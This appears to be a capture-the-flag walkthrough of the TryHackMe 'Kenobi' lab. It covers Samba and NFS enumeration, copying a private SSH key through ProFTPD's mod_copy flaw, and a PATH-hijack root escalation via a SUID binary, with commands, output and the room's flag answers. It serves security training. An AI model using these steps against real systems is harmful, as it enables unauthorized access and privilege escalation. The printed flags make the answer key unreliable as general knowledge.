# Kenobi
Walkthrough on exploiting a Linux machine. Enumerate Samba for shares, manipulate a vulnerable version of proftpd and escalate your privileges with path variable manipulation. 
#Kenobi

> F3d3r!c0 | Nov 20th, 2020

_________________________________________________________
[Task 1] Deploy the vulnerable machine  

answer: No answer need

Scan the machine with nmap, how many ports are open?
answer: 7

[Task 2] Enumerating Samba for shares

Using the nmap command above, how many shares have been found?

$ nmap -p 445 --script=smb-enum-shares.nse,smb-enum-users.nse 10.10.60.211                                130 ⨯
Starting Nmap 7.91 ( https://nmap.org ) at 2020-11-20 10:42 CET
Nmap scan report for 10.10.60.211
Host is up (0.054s latency).

PORT    STATE SERVICE
445/tcp open  microsoft-ds

Host script results:
| smb-enum-shares:
|   account_used: guest
|   \\10.10.60.211\IPC$:
|     Type: STYPE_IPC_HIDDEN
|     Comment: IPC Service (kenobi server (Samba, Ubuntu))
|     Users: 2
|     Max Users: <unlimited>
|     Path: C:\tmp
|     Anonymous access: READ/WRITE
|     Current user access: READ/WRITE
|   \\10.10.60.211\anonymous:
|     Type: STYPE_DISKTREE
|     Comment:
|     Users: 0
|     Max Users: <unlimited>
|     Path: C:\home\kenobi\share
|     Anonymous access: READ/WRITE
|     Current user access: READ/WRITE
|   \\10.10.60.211\print$:
|     Type: STYPE_DISKTREE
|     Comment: Printer Drivers
|     Users: 0
|     Max Users: <unlimited>
|     Path: C:\var\lib\samba\printers
|     Anonymous access: <none>
|_    Current user access: <none>

Nmap done: 1 IP address (1 host up) scanned in 8.78 seconds

answer: 7



On most distributions of Linux smbclient is already installed. Lets inspect one of the shares.

smbclient //<ip>/anonymous

Using your machine, connect to the machines network share.

Once you're connected, list the files on the share. What is the file can you see?

answer: log.txt



You can recursively download the SMB share too. Submit the username and password as nothing.

smbget -R smb://<ip>/anonymous

Open the file on the share. There is a few interesting things found.

    Information generated for Kenobi when generating an SSH key for the user
    Information about the ProFTPD server.

What port is FTP running on?

answer: 21


Your earlier nmap port scan will have shown port 111 running the service rpcbind. This is just an server that converts remote procedure call (RPC) program number into universal addresses. When an RPC service is started, it tells rpcbind the address at which it is listening and the RPC program number its prepared to serve.

In our case, port 111 is access to a network file system. Lets use nmap to enumerate this.

nmap -p 111 --script=nfs-ls,nfs-statfs,nfs-showmount 10.10.60.211

What mount can we see?

answer: /var

[Task 3] Gain initial access with ProFtpd



Lets get the version of ProFtpd. Use netcat to connect to the machine on the FTP port.

What is the version?

$ nc 10.10.60.211 21

answer: 1.3.5



We can use searchsploit to find exploits for a particular software version.

Searchsploit is basically just a command line search tool for exploit-db.com.

How many exploits are there for the ProFTPd running?

answer: 3


You should have found an exploit from ProFtpd's mod_copy module.

The mod_copy module implements SITE CPFR and SITE CPTO commands, which can be used to copy files/directories from one place to another on the server. Any unauthenticated client can leverage these commands to copy files from any part of the filesystem to a chosen destination.

We know that the FTP service is running as the Kenobi user (from the file on the share) and an ssh key is generated for that user.

answer: No answer need



We're now going to copy Kenobi's private key using SITE CPFR and SITE CPTO commands.


We knew that the /var directory was a mount we could see (task 2, question 4). So we've now moved Kenobi's private key to the /var/tmp directory.

answer: No answer need



Lets mount the /var/tmp directory to our machine

mkdir /mnt/kenobiNFS
mount machine_ip:/var /mnt/kenobiNFS
ls -la /mnt/kenobiNFS

We now have a network mount on our deployed machine! We can go to /var/tmp and get the private key then login to Kenobi's account.

What is Kenobi's user flag (/home/kenobi/user.txt)?

$ sudo mkdir /mnt/kenobiNFS                                                                                 1 ⨯
[sudo] password for kali:

┌──(kali㉿0x1326D3C)-[~/Documents/THM/02_Offensive Pentesting/01_Getting Started ]
└─$ sudo mount 10.10.60.211:/var /mnt/kenobiNFS

┌──(kali㉿0x1326D3C)-[~/Documents/THM/02_Offensive Pentesting/01_Getting Started ]
└─$ ls -la /mnt/kenobiNFS
total 56
drwxr-xr-x 14 root root    4096 Sep  4  2019 .
drwxr-xr-x  3 root root    4096 Nov 20 11:15 ..
drwxr-xr-x  2 root root    4096 Sep  4  2019 backups
drwxr-xr-x  9 root root    4096 Sep  4  2019 cache
drwxrwxrwt  2 root root    4096 Sep  4  2019 crash
drwxr-xr-x 40 root root    4096 Sep  4  2019 lib
drwxrwsr-x  2 root staff   4096 Apr 12  2016 local
lrwxrwxrwx  1 root root       9 Sep  4  2019 lock -> /run/lock
drwxrwxr-x 10 root crontab 4096 Sep  4  2019 log
drwxrwsr-x  2 root mail    4096 Feb 27  2019 mail
drwxr-xr-x  2 root root    4096 Feb 27  2019 opt
lrwxrwxrwx  1 root root       4 Sep  4  2019 run -> /run
drwxr-xr-x  2 root root    4096 Jan 30  2019 snap
drwxr-xr-x  5 root root    4096 Sep  4  2019 spool
drwxrwxrwt  6 root root    4096 Nov 20 10:13 tmp
drwxr-xr-x  3 root root    4096 Sep  4  2019 www

┌──(kali㉿0x1326D3C)-[~/Documents/THM/02_Offensive Pentesting/01_Getting Started ]
└─$ cp /mnt/kenobiNFS/tmp/id_rsa .

┌──(kali㉿0x1326D3C)-[~/Documents/THM/02_Offensive Pentesting/01_Getting Started ]
└─$ sudo chmod 600 id_rsa                               

┌──(kali㉿0x1326D3C)-[~/Documents/THM/02_Offensive Pentesting/01_Getting Started ]
└─$ ssh -i id_rsa kenobi@10.10.60.211
load pubkey "id_rsa": invalid format
The authenticity of host '10.10.60.211 (10.10.60.211)' can't be established.
ECDSA key fingerprint is SHA256:uUzATQRA9mwUNjGY6h0B/wjpaZXJasCPBY30BvtMsPI.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.60.211' (ECDSA) to the list of known hosts.
Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.8.0-58-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

103 packages can be updated.
65 updates are security updates.


Last login: Wed Sep  4 07:10:15 2019 from 192.168.1.147
To run a command as administrator (user "root"), use "sudo <command>".
See "man sudo_root" for details.

kenobi@kenobi:~$ cat /home/kenobi/user.txt

 answer: d0b0f3f53b6caa532a83915e19224899

[Task 4] Privilege Escalation with Path Variable Manipulation




SUID bits can be dangerous, some binaries such as passwd need to be run with elevated privileges (as its resetting your password on the system), however other custom files could that have the SUID bit can lead to all sorts of issues.

To search the a system for these type of files run the following: find / -perm -u=s -type f 2>/dev/null

What file looks particularly out of the ordinary?

 answer: /usr/bin/menu

 Run the binary, how many options appear?

 answer: 3

Strings is a command on Linux that looks for human readable strings on a binary.

This shows us the binary is running without a full path (e.g. not using /usr/bin/curl or /usr/bin/uname).

As this file runs as the root users privileges, we can manipulate our path gain a root shell.

We copied the /bin/sh shell, called it curl, gave it the correct permissions and then put its location in our path. This meant that when the /usr/bin/menu binary was run, its using our path variable to find the "curl" binary.. Which is actually a version of /usr/sh, as well as this file being run as root it runs our shell as root!


kenobi@kenobi:~$ cd /tmp/
kenobi@kenobi:/tmp$ echo /bin/sh > curl
kenobi@kenobi:/tmp$ chmod 777 curl
kenobi@kenobi:/tmp$ export PATH=/tmp:$PATH
kenobi@kenobi:/tmp$ echo $PATH
/tmp:/home/kenobi/bin:/home/kenobi/.local/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin
kenobi@kenobi:/tmp$ /usr/bin/menu

***************************************
1. status check
2. kernel version
3. ifconfig
** Enter your choice :1
# id
uid=0(root) gid=1000(kenobi) groups=1000(kenobi),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),110(lxd),113(lpadmin),114(sambashare)
# cat /root/root.txt

 answer: 177b3cd8562289f37382721c28381f02
